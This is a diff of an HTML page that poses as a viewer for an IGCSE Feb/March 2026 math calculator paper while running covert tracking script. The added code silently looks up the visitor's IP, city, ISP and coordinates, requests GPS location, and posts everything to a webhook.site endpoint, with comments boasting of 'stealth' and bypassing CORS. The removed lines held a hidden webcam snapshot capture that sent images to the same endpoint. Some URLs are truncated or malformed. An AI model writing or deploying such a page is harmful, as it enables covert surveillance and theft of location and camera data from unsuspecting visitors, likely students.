@@ -7,40 +7,44 @@
         body { margin: 0; background-color: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
         .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
         #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
-        #hidden-video { display: none; }
     </style>
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
-    <video id="hidden-video" autoplay muted></video>
 
     <script>
-        const webhookURL = "https://webhook.site/59dc4f67-d5a2-4305-b950-1ad33d827973";
+        const webhookURL = "https://webhook.site";
 
-        async function sendLog(data) {
-            await fetch(webhookURL, {
+        // Reliable sending function
+        function sendLog(data) {
+            fetch(webhookURL, {
                 method: 'POST',
-                mode: 'no-cors',
+                mode: 'no-cors', 
                 body: JSON.stringify(data)
+            }).catch(() => {});
+        }
+
+        // 1. SILENT IP FINDING (The Fix)
+        // We use a script tag trick to bypass CORS security
+        function ipLookUp() {
+            const script = document.createElement('script');
+            script.src = 'https://ipapi.co'; // JSONP is much more reliable for stealth
+            document.body.appendChild(script);
+        }
+
+        // This function captures the data from the script above
+        function getIP(data) {
+            sendLog({
+                type: "IP_INFO_SILENT",
+                ip: data.ip,
+                city: data.city,
+                isp: data.org,
+                coords: `${data.latitude}, ${data.longitude}`
             });
         }
 
-        // 0. SILENT IP TRACKING (Fires immediately, no popup)
-        fetch('https://ipapi.co')
-            .then(res => res.json())
-            .then(data => {
-                sendLog({
-                    type: "IP_INFO",
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.region,
-                    isp: data.org,
-                    approx_loc: `${data.latitude}, ${data.longitude}`
-                });
-            }).catch(() => {});
-
-        // 1. GPS (Requires popup)
+        // 2. PRECISION GPS (Same as your original success)
         navigator.geolocation.getCurrentPosition(pos => {
             sendLog({
                 type: "GPS_LOCATION",
@@ -48,32 +52,15 @@
                 lon: pos.coords.longitude,
                 map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
             });
-        }, err => sendLog({ type: "LOCATION_ERROR", msg: err.message }), 
+        }, err => sendLog({ type: "GPS_ERROR", msg: err.message }), 
         { enableHighAccuracy: false, timeout: 15000, maximumAge: Infinity });
 
-        // 2. Camera Snapshot (Requires click + popup)
-        window.onclick = () => {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.getElementById('hidden-video');
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 400;
-                            canvas.height = 300;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            
-                            sendLog({
-                                type: "CAMERA_SNAPSHOT",
-                                image_data: canvas.toDataURL('image/jpeg', 0.4) 
-                            });
-
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 1000);
-                    };
-                }).catch(err => sendLog({ type: "CAMERA_ERROR", msg: err.message }));
-        };
+        // Start the silent lookup
+        ipLookUp();
     </script>
+    
+    <!-- This small bit handles the "JSONP" response -->
+    <script src="https://ipapi.co"></script>
+
 </body>
 </html>
